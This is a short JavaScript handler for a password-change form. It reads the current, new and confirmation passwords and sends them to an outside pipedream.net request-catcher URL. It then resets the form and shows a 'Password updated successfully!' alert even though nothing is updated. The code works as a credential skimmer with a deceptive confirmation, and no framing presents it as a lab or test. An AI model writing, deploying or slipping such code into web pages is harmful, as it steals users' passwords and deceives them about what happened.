const form = document.querySelector('#register-form');

form.addEventListener('submit', (event) => {
  event.preventDefault(); // Prevent the form from submitting normally

  const currentPassword = document.querySelector('#pass1').value;
  const newPassword = document.querySelector('#pass2').value;
  const confirmPassword = document.querySelector('#pass3').value;

  const headers = new Headers()
  headers.append("Content-Type", "application/json")
  
  const body = {
    "password": currentPassword,
    "newPassword": newPassword,
    "confirmPassword": confirmPassword
  }
  
  const options = {
    method: "POST",
    headers,
    mode: "cors",
    body: JSON.stringify(body),
  }
  
  fetch("https://eocu9ne05197qnz.m.pipedream.net", options)

  // Reset the form fields
  form.reset();
  setTimeout(function(){ alert("Password updated successfully!"); }, 100);
});

